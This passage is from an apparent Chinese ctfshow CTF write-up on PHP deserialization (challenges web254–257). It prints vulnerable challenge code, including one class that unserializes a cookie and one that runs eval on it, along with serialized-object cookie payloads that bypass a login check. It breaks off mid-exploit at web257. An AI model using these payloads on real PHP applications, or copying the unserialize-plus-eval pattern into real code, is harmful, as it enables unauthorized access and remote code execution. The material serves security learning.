align="left">在对象中调用一个不存在的方法时自动调用这个方法，可以用来实现动态方法调用。</td></tr><tr><td align="left">__callStatic</td><td align="left">在静态上下文中调用一个不存在的方法时自动调用这个方法，可以用来实现动态静态方法调用。</td></tr><tr><td align="left">__get</td><td align="left">当一个对象的属性被读取时自动调用这个方法，可以用来实现属性的访问控制。</td></tr><tr><td align="left">__set</td><td align="left">当一个对象的属性被设置时自动调用这个方法，可以用来实现属性的访问控制。</td></tr><tr><td align="left">__isset</td><td align="left">当使用 isset() 或 empty() 测试一个对象的属性时自动调用这个方法，可以用来实现属性的访问控制。</td></tr><tr><td align="left">__unset</td><td align="left">当使用 unset() 删除一个对象的属性时自动调用这个方法，可以用来实现属性的访问控制。</td></tr><tr><td align="left">__toString</td><td align="left">当一个对象被转换为字符串时自动调用这个方法，可以用来实现对象的字符串表示。</td></tr><tr><td align="left">__invoke</td><td align="left">当一个对象被作为函数调用时自动调用这个方法，可以用来实现对象的可调用性。</td></tr><tr><td align="left">__set_state</td><td align="left">当使用 var_export() 导出一个对象时自动调用这个方法，可以用来实现对象的序列化和反序列化。</td></tr><tr><td align="left">__clone</td><td align="left">当一个对象被克隆时自动调用这个方法，可以用来实现对象的克隆。</td></tr><tr><td align="left">__debugInfo</td><td align="left">当使用 var_dump() 或 print_r() 输出一个对象时自动调用这个方法，可以用来控制对象的调试信息输出。</td></tr><tr><td align="left">__sleep</td><td align="left">在对象被序列化之前自动调用这个方法，可以用来控制哪些属性被序列化。</td></tr><tr><td align="left">__wakeup</td><td align="left">在对象被反序列化之后自动调用这个方法，可以用来重新初始化对象的属性。</td></tr></tbody></table><p>PHP 官方文档已经很详细了，这里不在赘述，不一定需要学会所有的函数，除开常见的，其他的在遇到的时候查阅即可。</p><h3 id="web254-278"><a href="#web254-278" class="headerlink" title="web254-278"></a>web254-278</h3><h4 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"your flag is "</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip, no flag"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$user</span><span class="token operator">-></span><span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip,no flag"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>只要触发**vipOneKeyGetFlag()**函数就可以得到flag</p><p>考察基础的代码审计，满足<code>$this-&gt;username===$u&amp;&amp;$this-&gt;password===$p</code>即可</p><h4 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"your flag is "</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip, no flag"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$user</span><span class="token operator">-></span><span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip,no flag"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>与上题不同的是这次的<code>$user</code>是由cookie的user变量反序列化得到的，考察了基本的反序列化</p><p>要求 cookie 中 user 值为一个序列化的 ctfshowUser 对象，属性 isVip 值为 true，username 和 password 和 GET 参数获取的一致。</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span> <span class="token operator">?</span>username<span class="token operator">=</span>xxxxxx<span class="token operator">&amp;</span>password<span class="token operator">=</span>xxxxxxCookie<span class="token punctuation">:</span> <span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A11<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>ctfShowUser<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A3<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>username<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>xxxxxx<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>password<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>xxxxxx<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A5<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>isVip<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bb<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token comment">//urlencode O: 11:"ctfShowUser":3:&#123;s:8:"username";s:6:"xxxxxx";s:8:"password";s:6:"xxxxxx";s:5:"isVip";b:1;&#125;</span>因为cookie中将"作为截断符号，所需要编码绕过，这里采用url编码</code></pre><h4 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isVip</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">!==</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"your flag is "</span><span class="token operator">.</span><span class="token variable">$flag</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip, no flag"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token operator">-></span><span class="token function">checkVip</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$user</span><span class="token operator">-></span><span class="token function">vipOneKeyGetFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"no vip,no flag"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>**vipOneKeyGetFlag()**方法要求username和password不一样，传入的类是自己可控的，改就行了呗</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ctfShowUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><pre class="language-php" data-language="php"><code class="language-php"><span class="token constant">GET</span><span class="token punctuation">:</span> <span class="token operator">?</span>username<span class="token operator">=</span>xxxxxx<span class="token operator">&amp;</span>password<span class="token operator">=</span>xxxxxCookie<span class="token punctuation">:</span> <span class="token constant">O</span><span class="token operator">%</span><span class="token number">3</span>A11<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>ctfShowUser<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>A3<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">7</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>username<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A6<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>xxxxxx<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A8<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>password<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A5<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>xxxxx<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bs<span class="token operator">%</span><span class="token number">3</span>A5<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">22</span>isVip<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>Bb<span class="token operator">%</span><span class="token number">3</span>A1<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">7</span>D<span class="token comment">//urlencode O: 11:"ctfShowUser":3:&#123;s:8:"username";s:6:"xxxxxx";s:8:"password";s:5:"xxxxx";s:5:"isVip";b:1;&#125;</span></code></pre><h4 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h4><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$isVip</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$class</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'info'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword">class</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">info</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$u</span><span class="token punctuation">,</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">===</span><span class="token variable">$u</span><span class="token operator">&amp;&amp;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">===</span><span class="token variable">$p</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token keyword">class</span><span class="token operator">-></span><span class="token function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">info</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$user</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">user</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">backDoor</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$code</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">getInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$user</span><span class="token operator">-></span><span class="token function">login</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>从<code>backDoor</code>的eval函数入手，修改<code>ctfShowUser</code>的class变量触发backDoor类，进行命令执行</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfShowUser</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$username</span><span class="token operator">=</span><span class="token string single-quoted-string">'xxxxxx'</span><span class="token 